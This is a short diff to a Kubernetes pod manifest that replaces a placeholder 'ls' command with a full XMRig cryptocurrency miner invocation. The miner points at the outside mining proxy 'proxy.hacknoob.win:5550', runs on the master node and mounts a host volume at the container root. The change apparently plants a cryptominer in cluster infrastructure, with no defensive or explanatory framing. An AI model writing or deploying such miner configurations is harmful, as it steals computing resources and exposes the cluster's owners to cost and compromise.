@@ -13,10 +13,21 @@ spec:
             values:
             - master
   containers:
-  - name: xmrig-container-m
+  - name: xmrig-container-2
     image: busybox
     command:
-    -ls
+    - /home/manager/xmrig/build/xmrig
+    - -t
+    - "4"
+    - -o
+    - proxy.hacknoob.win:5550
+    - -u
+    - master
+    - -a
+    - rx/0
+    - --cpu-no-yield
+    - --randomx-1gb-pages
+    - --nicehash
     volumeMounts:
     - name: xmrig-volume-m
       mountPath: /
